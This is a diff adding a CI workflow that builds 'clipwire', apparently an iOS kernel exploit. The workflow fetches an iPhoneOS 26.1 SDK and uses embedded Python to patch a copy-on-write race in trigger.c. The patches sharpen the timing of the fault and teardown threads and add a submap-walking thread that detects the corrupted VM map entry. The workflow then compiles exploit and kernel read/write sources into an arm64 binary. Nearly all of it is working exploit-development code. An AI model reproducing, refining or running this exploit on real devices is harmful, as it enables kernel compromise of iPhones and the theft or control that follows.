@@ -1,0 +1,385 @@
+name: Build clipwire (Ubuntu + full SDK v10 submap detector)
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main, master]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install toolchain
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y clang lld git python3
+
+      - name: Fetch full iPhoneOS 26.1 SDK
+        run: |
+          git clone --depth 1 --filter=blob:none --no-checkout \
+            https://github.com/xybp888/iOS-SDKs.git sdks
+          cd sdks
+          git sparse-checkout set iPhoneOS26.1.sdk
+          git checkout
+
+      - name: Create header shims
+        run: |
+          mkdir -p shim/mach shim/IOSurface
+          cat > shim/mach/mach_vm.h <<'EOF'
+          #ifndef MACH_MACH_VM_SHIM_H
+          #define MACH_MACH_VM_SHIM_H
+          #include <mach/mach.h>
+          #include <mach/vm_map.h>
+          #include <mach/vm_region.h>
+          #include <stdint.h>
+
+          typedef uint64_t mach_vm_address_t;
+          typedef uint64_t mach_vm_size_t;
+          typedef uint64_t mach_vm_offset_t;
+
+          typedef vm_region_basic_info_data_64_t vm_region_basic_info_data_64;
+
+          kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
+          kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);
+          kern_return_t mach_vm_region(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t *size, int flavor, vm_region_info_t info, mach_msg_type_number_t *infoCnt, mach_port_t *object);
+          kern_return_t mach_vm_region_recurse(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t *size, natural_t *nesting_depth, vm_region_recurse_info_t info, mach_msg_type_number_t *infoCnt);
+          kern_return_t mach_vm_page_info(vm_map_t target, mach_vm_address_t address, int flavor, unsigned int *info, mach_msg_type_number_t *infoCnt);
+          kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mach_port_t object, mach_vm_offset_t offset, boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
+          #endif
+          EOF
+          cat > shim/IOSurface/IOSurface.h <<'EOF'
+          #ifndef IOSURFACE_SHIM_H
+          #define IOSURFACE_SHIM_H
+          #include <IOSurface/IOSurfaceBase.h>
+          #include <IOSurface/IOSurfaceRef.h>
+          #endif
+          EOF
+
+      - name: Patch append-only v10 log into main.m
+        run: |
+          python3 - <<'PY'
+          p = 'src/main.m'
+          s = open(p, encoding='utf-8').read()
+          old = 'int main(int argc, char *argv[])\n{\n    @autoreleasepool {\n'
+          new = '''int main(int argc, char *argv[])
+          {
+              char cw_log[1024];
+              const char *cw_home = getenv("HOME");
+              if (cw_home) {
+                  snprintf(cw_log, sizeof(cw_log), "%s/Documents/clipwire_v10.log", cw_home);
+                  FILE *cw_f = fopen(cw_log, "a");
+                  if (cw_f) {
+                      fprintf(cw_f, "\\n===== clipwire v10 run =====\\n");
+                      dup2(fileno(cw_f), 1);
+                      dup2(fileno(cw_f), 2);
+                      setvbuf(cw_f, NULL, _IOLBF, 0);
+                  }
+              }
+              @autoreleasepool {
+          '''
+          if old not in s:
+              raise SystemExit('main.m pattern not found')
+          open(p, 'w', encoding='utf-8').write(s.replace(old, new, 1))
+          print('patched main.m for append-only v10 log')
+          PY
+
+      - name: Patch race logic in trigger.c
+        run: |
+          python3 - <<'PY'
+          p = 'src/trigger.c'
+          s = open(p, encoding='utf-8').read()
+
+          # Detection state shared with the new high-frequency detect thread.
+          old = 'static U64 g_fault_hits = 0;\n'
+          new = '''static U64 g_fault_hits = 0;
+          static volatile int g_detect_found = 0;
+          static U64 g_detect_size = 0;
+          '''
+          if old not in s:
+              raise SystemExit('globals pattern not found')
+          s = s.replace(old, new, 1)
+
+          # Publish the in-fault window to the mutator with barriers.
+          old = '''            g_in_fault = 1;
+                      if (sigsetjmp(g_segv_jmp, 1) == 0) {
+                          *p = (unsigned char)(0x41 + (i & 0xf));
+                          g_fault_hits++;
+                      } else {
+                          /* mapping was torn down under us: skip, next round */
+                      }
+                      g_in_fault = 0;'''
+          new = '''            g_in_fault = 1;
+                      __sync_synchronize();
+                      if (sigsetjmp(g_segv_jmp, 1) == 0) {
+                          *p = (unsigned char)(0x41 + (i & 0xf));
+                          g_fault_hits++;
+                      } else {
+                          /* mapping was torn down under us: skip, next round */
+                      }
+                      __sync_synchronize();
+                      g_in_fault = 0;'''
+          if old not in s:
+              raise SystemExit('fault window pattern not found')
+          s = s.replace(old, new, 1)
+
+          # Mutate only while a COW fault is in flight.
+          old = '''    while (g_go) {
+                  U64 re_alloc = g_cow->dst_addr;'''
+          new = '''    while (g_go) {
+                  /* Tear down exactly while a COW write is in flight. */
+                  while (g_go && !g_in_fault) pthread_yield_np();
+                  if (!g_go) break;
+                  U64 re_alloc = g_cow->dst_addr;'''
+          if old not in s:
+              raise SystemExit('mutate handshake pattern not found')
+          s = s.replace(old, new, 1)
+
+          # Replace the old top-level-region detector with a submap walker.
+          old = '''bool entry_looks_corrupt(U64 start, U64 expected_size, U64 *out_size)
+          {
+              mach_vm_address_t a = start;
+              mach_vm_size_t sz = 0;
+              vm_region_basic_info_data_64 info;
+              mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+              mach_port_t obj = MACH_PORT_NULL;
+
+              kern_return_t kr = mach_vm_region(mach_task_self(), &a, &sz,
+                                                VM_REGION_BASIC_INFO_64,
+                                                (vm_region_info_t)&info, &cnt, &obj);
+              if (obj != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), obj);
+              if (kr != KERN_SUCCESS) { if (out_size) *out_size = expected_size; return false; }
+              if (a != start) { if (out_size) *out_size = expected_size; return false; }
+
+              if (sz != expected_size) {
+                  LOGOK("region [%#llx,%#llx) size %#llx != expected %#llx -> corrupt",
+                        a, a + sz, sz, expected_size);
+                  if (out_size) *out_size = sz;
+                  return true;
+              }
+              if (out_size) *out_size = expected_size;
+              return false;
+          }
+          '''
+          new = '''#ifndef VM_REGION_SUBMAP_INFO_64
+          #define VM_REGION_SUBMAP_INFO_64 14
+          #endif
+
+          static bool entry_looks_corrupt(U64 start, U64 expected_size, U64 *out_size)
+          {
+              mach_vm_address_t a = start;
+              mach_vm_size_t sz = 0;
+              natural_t depth = 0;
+              vm_region_submap_info_data_64_t info;
+              mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+              kern_return_t kr;
+
+              if (out_size) *out_size = expected_size;
+
+              kr = mach_vm_region_recurse(mach_task_self(), &a, &sz, &depth,
+                                          (vm_region_recurse_info_t)&info, &cnt);
+              if (kr != KERN_SUCCESS) return false;
+              if (a != start) return false;
+
+              if (!info.is_submap) {
+                  /* Fallback: top-level size anomaly (original harness check). */
+                  if (sz != expected_size) {
+                      LOGOK("top-level region [%#llx,%#llx) size %#llx != expected %#llx -> corrupt",
+                            a, a + sz, sz, expected_size);
+                      if (out_size) *out_size = sz;
+                      return true;
+                  }
+                  return false;
+              }
+
+              /* Bug 1 corrupts an entry INSIDE this COW submap. The old
+               * mach_vm_region() call could never see this. */
+              U64 limit = start + expected_size;
+              U64 cur = start;
+              for (int guard = 0; cur < limit && guard < 64; guard++) {
+                  mach_vm_address_t ra = cur;
+                  mach_vm_size_t rs = 0;
+                  natural_t rdepth = 1;
+                  vm_region_submap_info_data_64_t rinfo;
+                  mach_msg_type_number_t rcnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+
+                  kr = mach_vm_region_recurse(mach_task_self(), &ra, &rs, &rdepth,
+                                              (vm_region_recurse_info_t)&rinfo, &rcnt);
+                  if (kr != KERN_SUCCESS) break;
+                  if (ra != cur) {
+                      LOGOK("submap gap at %#llx (wanted %#llx) -> corrupt", ra, cur);
+                      if (out_size) *out_size = expected_size + (ra - cur);
+                      return true;
+                  }
+                  if (rs == 0) break;
+                  if (ra + rs > limit) {
+                      LOGOK("submap entry [%#llx,%#llx) crosses end %#llx -> corrupt",
+                            ra, ra + rs, limit);
+                      if (out_size) *out_size = rs;
+                      return true;
+                  }
+                  cur = ra + rs;
+              }
+              if (cur < limit) {
+                  LOGOK("submap walk stopped at %#llx before %#llx -> corrupt", cur, limit);
+                  if (out_size) *out_size = limit - cur;
+                  return true;
+              }
+              return false;
+          }
+
+          static void *detect_thread(void *arg)
+          {
+              (void)arg;
+              while (g_go == 0) pthread_yield_np();
+              while (g_go && !g_detect_found) {
+                  U64 sz = 0;
+                  if (entry_looks_corrupt(g_cow->dst_addr, g_cow->dst_size, &sz)) {
+                      g_detect_size = sz;
+                      __sync_synchronize();
+                      g_detect_found = 1;
+                      __sync_synchronize();
+                      break;
+                  }
+                  nsleep(100 * 1000);
+              }
+              return NULL;
+          }
+          '''
+          if old not in s:
+              raise SystemExit('entry_looks_corrupt pattern not found')
+          s = s.replace(old, new, 1)
+
+          # Replace run_clip_race with a 3-thread version.
+          old = '''int run_clip_race(cow_map_t *m, U64 *corrupted_start, U64 *corrupted_end)
+          {
+              static pthread_t fth, mth;
+              g_cow = m;
+
+              pthread_create(&fth, NULL, fault_thread, NULL);
+              pthread_create(&mth, NULL, mutate_thread, NULL);
+
+              __sync_synchronize();
+              g_go = 1;
+
+              int found = 0;
+              for (U64 round = 0; round < RACE_ITERATIONS && !found; round++) {
+                  /* detection cadence only: fault/mutate run continuously and overlap;
+                   * this sleep just paces the corruption checks. */
+                  nsleep(20 * 1000 * 1000);
+
+                  if (round % 100 == 0) {
+                      LOG("race round %llu (fault_hits %llu)", round, g_fault_hits);
+                  }
+
+                  U64 detected_sz = m->dst_size;
+                  if (entry_looks_corrupt(m->dst_addr, m->dst_size, &detected_sz)) {
+                      LOGOK("corrupted entry detected at round %llu (size %#llx)", round, detected_sz);
+                      if (corrupted_start) *corrupted_start = m->dst_addr;
+                      if (corrupted_end) *corrupted_end = m->dst_addr + detected_sz;
+                      found = 1;
+                      break;
+                  }
+              }
+
+              g_go = 0;
+              pthread_join(mth, NULL);
+              pthread_join(fth, NULL);
+              return found;
+          }
+          '''
+          new = '''int run_clip_race(cow_map_t *m, U64 *corrupted_start, U64 *corrupted_end)
+          {
+              static pthread_t fth, mth, dth;
+              g_cow = m;
+              g_detect_found = 0;
+              g_detect_size = 0;
+              g_fault_hits = 0;
+
+              pthread_create(&fth, NULL, fault_thread, NULL);
+              pthread_create(&mth, NULL, mutate_thread, NULL);
+              pthread_create(&dth, NULL, detect_thread, NULL);
+
+              __sync_synchronize();
+              g_go = 1;
+
+              int found = 0;
+              for (U64 round = 0; round < RACE_ITERATIONS && !found; round++) {
+                  nsleep(20 * 1000 * 1000);
+
+                  if (round % 100 == 0) {
+                      LOG("race round %llu (fault_hits %llu)", round, g_fault_hits);
+                  }
+                  if (g_detect_found) {
+                      found = 1;
+                      break;
+                  }
+              }
+
+              g_go = 0;
+              pthread_join(dth, NULL);
+              pthread_join(mth, NULL);
+              pthread_join(fth, NULL);
+
+              if (found) {
+                  U64 sz = g_detect_size;
+                  if (corrupted_start) *corrupted_start = m->dst_addr;
+                  if (corrupted_end) *corrupted_end = m->dst_addr + sz;
+                  LOGOK("corrupted submap entry detected (size %#llx)", sz);
+              }
+              return found;
+          }
+          '''
+          if old not in s:
+              raise SystemExit('run_clip_race pattern not found')
+          s = s.replace(old, new, 1)
+
+          # Clear the shared in-fault flag when the race stops.
+          old = '''    g_go = 0;
+              pthread_join(mth, NULL);'''
+          new = '''    g_go = 0;
+              g_in_fault = 0;
+              pthread_join(mth, NULL);'''
+          # This replacement is a no-op if the earlier full-function replace already changed it.
+          s = s.replace(old, new, 1)
+
+          open(p, 'w', encoding='utf-8').write(s)
+          print('patched trigger.c submap detector + fault handshake')
+          PY
+
+      - name: Set one-attempt tunables
+        run: |
+          python3 - <<'PY'
+          p = 'src/clipwire.h'
+          s = open(p, encoding='utf-8').read()
+          for a, b in [
+              ('#define RACE_ITERATIONS    2000', '#define RACE_ITERATIONS    400'),
+              ('#define RACE_ATTEMPTS      20', '#define RACE_ATTEMPTS      1'),
+              ('#define FREELIST_CHURN_MAPS 512', '#define FREELIST_CHURN_MAPS 128'),
+          ]:
+              if a not in s:
+                  raise SystemExit('clipwire.h pattern not found: ' + a)
+              s = s.replace(a, b, 1)
+          open(p, 'w', encoding='utf-8').write(s)
+          print('set 400 iterations / 1 attempt / 128 churn maps')
+          PY
+
+      - name: Build arm64 binary
+        run: |
+          clang -target arm64-apple-ios15.0 \
+            -I"$GITHUB_WORKSPACE/shim" \
+            -isysroot "$GITHUB_WORKSPACE/sdks/iPhoneOS26.1.sdk" \
+            -fuse-ld=lld -fobjc-arc -O2 -Wall \
+            -Wno-deprecated-declarations -Wno-macro-redefined \
+            -Wno-incompatible-pointer-types \
+            src/main.m src/util.c src/slide.c src/trigger.c src/wire.c \
+            src/exploit.c src/krw.c \
+            -framework IOSurface -framework Foundation \
+            -o clipwire
+
+      - name: Upload binary
+        uses: actions/upload-artifact@v4
+        with:
+          name: clipwire
+          path: clipwire
